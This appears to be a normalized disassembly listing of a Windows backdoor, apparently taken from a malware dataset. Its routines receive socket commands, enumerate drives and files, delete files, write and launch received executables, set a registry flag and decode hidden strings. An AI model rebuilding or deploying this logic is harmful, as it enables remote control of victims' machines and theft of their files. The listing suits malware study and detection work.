push eax
call [ fread@IAT ]
mov ebx eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
lea eax [ ebp - 0x2008 ]
push esi
push eax
call sub_401fe3
lea eax [ ebp - 0x2008 ]
push ebx
push eax
call sub_401b0e
add esp 0x28
test eax eax
je r-xdata
sub_402389
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push [ rw-data ]
push eax
call strcpy
lea eax [ ebp - 0x400 ]
push eax
call strlen
add esp 0xc
mov esi eax
mov [ rw-data ] 0x4f
call sub_402c9e
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcpy
mov eax [ rw-data ]
add eax esi
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcat
mov eax [ rw-data ]
add eax esi
push eax
call strlen
add esp 0x14
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + esi ] 0x30
jne r-xdata
inc esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
sub_402432
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call memcpy
mov eax [ rw-data ]
xor esi esi
mov [ rw-data ] eax
add esp 0xc
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax 0x4a
jg r-xdata
sub eax 0x52
je r-xdata
je r-xdata
call sub_402975
dec eax
je r-xdata
call sub_402376
jmp r-xdata
sub eax 0x41
je r-xdata
push 0x1
pop eax
pop esi
leave
retn
mov [ rw-data ] esi
mov esi rw-data
push esi
mov [ ebp - 0x100 ] 0x5a
call strlen
add eax 0x5
push esi
mov [ ebp - 0xff ] eax
lea eax [ ebp - 0xfb ]
push eax
call strcpy
push esi
call strlen
add eax 0x5
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_401b9b
add esp 0x18
sub eax 0x3
je r-xdata
cmp [ rw-data ] esi
mov [ rw-data ] 0x1
je r-xdata
dec eax
je r-xdata
call sub_402cc3
jmp r-xdata
dec eax
dec eax
jne r-xdata
call sub_402993
jmp r-xdata
dec eax
dec eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
call sub_402389
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_40253b
mov eax sub_403bec
call _EH_prolog
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ GetTickCount@IAT ]
push edi
mov [ ebp - 0x10 ] esp
call esi
mov edi eax
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
call esi
mov edi eax
call sub_403175
test eax eax
je r-xdata
call esi
sub eax edi
cmp eax 0x36ee80
jbe r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x4
push rw-data
push rw-data
push 0x80000001
mov [ ebp - 0x14 ] 0x1
call [ SHSetValueA@IAT ]
sub_4025be
mov eax sub_403bf8
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ GetTickCount@IAT ]
push edi
mov [ ebp - 0x10 ] esp
call esi
mov edi eax
mov [ rw-data ] edi
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
call esi
mov ebx eax
sub eax edi
cmp eax 0xea60
jbe r-xdata
call esi
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_4017f8
mov edi ebx
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] ebx
cmp [ rw-data ] 0x0
je r-xdata
sub_402640
mov eax sub_403c04
call _EH_prolog
push ecx
mov eax 0x2004
call sub_403a10
push ebx
push esi
mov esi [ ebp - 0x14 ]
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
push 0x1
mov [ ebp - 0x4 ] ebx
mov [ rw-data ] ebx
pop edi
mov al [ ebp - 0x2014 ]
sub esi 0x5
mov [ rw-data ] al
mov [ rw-data ] ebx
call sub_40277c
cmp eax ebx
je r-xdata
push eax
lea eax [ ebp - 0x2014 ]
push eax
push [ rw-data ]
call memcpy
sub esi [ rw-data ]
add esp 0xc
cmp esi ebx
jg r-xdata
mov [ rw-data ] bl
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x2014 ]
push 0x5
push eax
call sub_4027dd
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
mov [ rw-data ] ebx
mov esi [ ebp - 0x2013 ]
cmp esi 0x5
jl r-xdata
cmp esi ebx
jg r-xdata
push edi
call [ Sleep@IAT ]
jmp r-xdata
mov [ rw-data ] edi
jmp r-xdata
push edi
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
cmp [ rw-data ] bl
jne r-xdata
cmp [ ebp - 0x2014 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x2014 ]
push esi
push eax
call sub_4027dd
pop ecx
cmp eax 0xffffffff
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov [ rw-data ] bl
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
jmp r-xdata
sub_40277c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ Sleep@IAT ]
xor ebx ebx
test eax eax
jle r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0xd
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
inc ebx
cmp ebx 0x4
jge r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
pop esi
pop ebx
leave
retn
push 0x1
pop eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_4027dd
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov eax 0x2000
xor esi esi
xor ebx ebx
cmp edi eax
jle r-xdata
test edi edi
jle r-xdata
mov edi eax
mov eax edi
mov eax edi
push 0x0
sub eax esi
push eax
mov eax [ esp + 0x18 ]
add eax esi
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jg r-xdata
add esi eax
xor ebx ebx
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp esi edi
jl r-xdata
sub_402849
push ebp
mov ebp esp
sub esp 0x488
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
lea eax [ ebp - 0x283 ]
push esi
push eax
mov [ ebp - 0x288 ] 0x41
call strcpy
push esi
call strlen
mov esi eax
mov eax [ rw-data ]
add esi 0x6
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
lea eax [ ebp - 0x488 ]
push eax
push 0x200
add esi 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push esi
push eax
mov [ ebp - 0x287 ] esi
call sub_401b9b
pop ecx
pop ecx
pop esi
leave
retn
cmp [ ebp - 0x488 ] 0x0
je r-xdata
push ebx
push edi
lea edi [ ebp - 0x488 ]
and [ ebp - 0x88 ] 0x0
xor eax eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x88 ]
push 0x80
push eax
push edi
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
push edi
call strlen
mov ebx eax
lea eax [ ebp + esi - 0x288 ]
push edi
push eax
inc ebx
call strcpy
add esp 0xc
add esi ebx
push edi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop ebx
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp + esi - 0x288 ]
push eax
call strcpy
lea eax [ ebp - 0x88 ]
push eax
call strlen
add [ ebp - 0x4 ] ebx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp + eax - 0x488 ] 0x0
lea edi [ ebp + eax - 0x488 ]
jne r-xdata
sub_402993
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push [ rw-data ]
push eax
call memcpy
mov esi [ strrchr@IAT ]
push 0x5c
push [ rw-data ]
call esi
push eax
call sub_402bde
lea eax [ ebp - 0x214 ]
push 0x5c
push eax
call esi
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call strcat
push 0x7d00
mov [ ebp - 0x14 ] 0x42
call [ malloc@IAT ]
mov edi eax
add esp 0xc
test edi edi
je r-xdata
and [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push eax
call sub_402b72
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
push edi
call [ free@IAT ]
pop ecx
test esi esi
jne r-xdata
lea eax [ esi + esi * 4 ]
push 0x5
shl eax 0x6
add eax 0x5
mov [ ebp - 0x13 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_401b9b
pop ecx
lea eax [ ebp - 0x214 ]
pop ecx
push edi
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
pop esi
push edi
call sub_402c2b
test eax eax
pop ecx
je r-xdata
lea eax [ edi + 0x2c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x8 ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_401fe3
push ebx
push edi
call sub_401b0e
push edi
call [ free@IAT ]
add esp 0x24
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea ebx [ esi - 0x1 ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0xc ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_401fe3
push ebx
push edi
call sub_401b0e
add esp 0x18
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push edi
push [ ebp - 0x4 ]
call sub_402b26
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push edi
call [ free@IAT ]
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
add [ ebp - 0x8 ] eax
lea esi [ eax + eax * 4 ]
lea eax [ ebp - 0xc ]
shl esi 0x6
push eax
push edi
push esi
push edi
call sub_401fe3
push esi
push edi
call sub_401b0e
add esp 0x18
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
sub_402b26
push ebx
push esi
mov esi [ FindNextFileA@IAT ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
push edi
push [ esp + 0x14 ]
mov eax ebx
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_402c2b
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx 0x64
jge r-xdata
inc ebx
add edi 0x140
push edi
push [ esp + 0x14 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_402b72
push ebp
mov ebp esp
sub esp 0x140
push esi
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor edi edi
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
lea eax [ ebp - 0x140 ]
push eax
call sub_402c2b
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_402bde
and [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
push edi
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
and [ esi ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ eax * 4 + rw-data ] edi
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
sub_402c2b
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test [ eax ] 0x10
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
add eax 0x2c
push 0x2e
push eax
call [ strrchr@IAT ]
xor ebp ebp
pop ecx
cmp [ rw-data ] ebp
pop ecx
mov ebx eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor eax eax
mov edi [ lstrcmpiA@IAT ]
mov esi rw-data
test ebx ebx
je r-xdata
push rw-data
push [ esi ]
mov eax [ esi ]
inc eax
inc eax
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
inc ebp
add esi 0x4
cmp ebp [ rw-data ]
jl r-xdata
call edi
test eax eax
je r-xdata
push rw-data
push [ esi ]
call edi
test eax eax
je r-xdata
sub_402c9e
push ebp
mov ebp esp
push ecx
push ecx
mov al [ rw-data ]
push 0x6
mov [ ebp - 0x3 ] al
pop eax
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x52
push eax
call sub_401b9b
pop ecx
pop ecx
leave
retn
sub_402cc3
push ebp
mov ebp esp
sub esp 0x108
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push rw-data
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
add eax 0x4
push eax
call strlen
mov edi eax
pop ecx
cmp edi 0x114
mov [ ebp - 0x8 ] edi
jae r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov esi rw-data
add eax 0x4
push eax
push esi
call strcpy
cmp [ rw-data ] 0x56
pop ecx
pop ecx
jne r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_402c9e
cmp [ rw-data ] 0x56
jne r-xdata
push ebx
push esi
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x108 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push esi
call strcpy
add esp 0x18
push esi
call sub_402e39
pop ecx
push rw-data
push rw-data
jmp r-xdata
mov [ rw-data ] 0x45
call sub_402c9e
jmp r-xdata
mov eax [ rw-data ]
lea edi [ eax + edi + 0x5 ]
mov eax [ rw-data ]
sub eax [ ebp - 0x8 ]
sub eax 0x5
jmp r-xdata
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push ecx
push edi
push eax
push edi
call sub_401fe3
push ebx
push [ ebp - 0x4 ]
push 0x1
push edi
call [ fwrite@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x24
cmp [ rw-data ] 0x0
je r-xdata
sub_402e39
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_402ef4
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0xff
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push rw-data
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ SHGetValueA@IAT ]
xor eax eax
cmp [ ebp - 0x4 ] 0x1
sete al
leave
retn
sub_402f34
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
push ebx
mov eax [ esp + 0x8 ]
lea ecx [ edx + eax ]
mov al [ edx + eax ]
sub al dl
xor al 0x7
mov bl al
shr bl 0x5
shl al 0x3
or bl al
inc edx
cmp edx [ esp + 0xc ]
mov [ ecx ] bl
jl r-xdata
pop ebx
sub_402f60
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
push 0x6
mov esi rw-data
pop ecx
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x30 ]
push 0x19
push eax
movsb [ edi ] [ esi ]
call sub_402f34
lea eax [ ebp - 0x14 ]
push 0xe
push eax
call sub_402f34
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x14
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push esi
push 0x0
lea eax [ ebp - 0x14 ]
push rw-data
push eax
lea eax [ ebp - 0x30 ]
push 0x50
push eax
call sub_401569
add esp 0x20
test eax eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax [ ebp - 0x4 ]
push 0x20
push esi
push rw-data
and [ eax + esi ] 0x0
call [ strncpy@IAT ]
add esp 0xc
sub_402ff7
push ebp
mov ebp esp
sub esp 0x400
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0xd
push edi
call [ strchr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push edi
call strlen
pop ecx
sub eax edi
jmp r-xdata
push esi
lea eax [ ebp - 0x400 ]
push edi
push eax
call memcpy
mov [ ebp + esi - 0x400 ] 0x3b
and [ ebp + esi - 0x3ff ] 0x0
lea eax [ ebp - 0x400 ]
lea esi [ ebp - 0x400 ]
push eax
dec esi
call strlen
add esp 0x10
lea ebx [ ebp + eax - 0x400 ]
mov esi 0x3fe
mov esi eax
cmp esi 0x400
jb r-xdata
xor eax eax
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
and [ esi ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push edi
call strlen
test eax eax
pop ecx
jle r-xdata
push [ ebp + 0xc ]
push edi
call strcmp
pop ecx
pop ecx
cmp esi ebx
jae r-xdata
push eax
push [ ebp + 0xc ]
push edi
call memcmp
add esp 0xc
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4030c2
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401569
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov ecx [ ebp - 0x4 ]
xor eax eax
mov cl [ ecx + esi - 0x1 ]
cmp cl [ ebp + 0x8 ]
sete al
mov edi eax
pop edi
pop esi
leave
retn
sub_403123
push ebp
mov ebp esp
sub esp 0xc
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x0
push rw-data
push [ ebp + 0xc ]
push 0x50
push [ ebp + 0x8 ]
call sub_401569
add esp 0x20
test eax eax
jne r-xdata
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0xc ]
push 0x8
movsd [ edi ] [ esi ]
push eax
push [ ebp + 0x10 ]
movsb [ edi ] [ esi ]
call memcmp
add esp 0xc
neg eax
sbb eax eax
pop edi
inc eax
pop esi
leave
retn
leave
retn
sub_403175
push ebp
mov ebp esp
sub esp 0x2cc
push ebx
push esi
push edi
push 0xff
call sub_4030c2
test eax eax
pop ecx
je r-xdata
call sub_402f60
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0xcc ]
[ edi ] [ esi ]
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0xb8 ]
[ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0xa4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x54 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x84 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x74 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x94 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x10 ] eax
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
push 0x13
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xcc ]
push eax
movsw [ edi ] [ esi ]
call sub_402f34
lea eax [ ebp - 0xb8 ]
push 0x13
push eax
call sub_402f34
lea eax [ ebp - 0xa4 ]
push 0xe
push eax
call sub_402f34
lea eax [ ebp - 0x48 ]
push 0xd
push eax
call sub_402f34
lea eax [ ebp - 0x54 ]
push 0x9
push eax
call sub_402f34
lea eax [ ebp - 0x2c ]
push 0x8
push eax
call sub_402f34
lea eax [ ebp - 0x84 ]
push 0xe
push eax
call sub_402f34
lea eax [ ebp - 0x20 ]
push 0x8
push eax
call sub_402f34
add esp 0x40
lea eax [ ebp - 0x74 ]
push 0xe
push eax
call sub_402f34
lea eax [ ebp - 0x38 ]
push 0x9
push eax
call sub_402f34
lea eax [ ebp - 0x94 ]
push 0xf
push eax
call sub_402f34
lea eax [ ebp - 0x10 ]
push 0x7
push eax
call sub_402f34
lea eax [ ebp - 0x64 ]
push 0xd
push eax
call sub_402f34
push 0x3e800
call [ malloc@IAT ]
mov edi eax
add esp 0x2c
test edi edi
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x48 ]
push edi
push eax
lea eax [ ebp - 0xcc ]
push eax
call sub_403123
add esp 0x10
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push edi
call sub_402f34
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
and [ eax + edi ] 0x0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x2cc ]
push eax
mov [ ebp - 0x14 ] 0x200
call [ GetComputerNameA@IAT ]
mov esi [ strstr@IAT ]
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x48 ]
push edi
push eax
lea eax [ ebp - 0xb8 ]
push eax
call sub_403123
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x2cc ]
push 0x1
push eax
lea eax [ ebp - 0x38 ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x48 ]
push edi
push eax
lea eax [ ebp - 0xa4 ]
push eax
call sub_403123
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
mov ebx rw-data
je r-xdata
lea eax [ ebp - 0x2cc ]
push 0x1
push eax
lea eax [ ebp - 0x94 ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
push 0x1
pop esi
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x64 ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push ebx
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax esi
jmp r-xdata
mov ebx rw-data
lea eax [ ebp - 0x2cc ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x2cc ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x20 ]
push eax
push edi
call esi
add esp 0x18
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x64 ]
push ebx
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x2cc ]
push 0x1
push eax
lea eax [ ebp - 0x20 ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x2cc ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x2c ]
push eax
push edi
call esi
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
lea eax [ ebp - 0x2cc ]
push 0x1
push eax
lea eax [ ebp - 0x74 ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x84 ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x2cc ]
push 0x1
push eax
lea eax [ ebp - 0x2c ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
push edi
call esi
push edi
mov esi eax
call [ free@IAT ]
add esp 0xc
xor eax eax
test esi esi
setne al
lea eax [ ebp - 0x2cc ]
push 0x1
push eax
lea eax [ ebp - 0x84 ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
sub_4035a8
push ebp
mov ebp esp
sub esp 0x2c4
push ebx
push esi
push edi
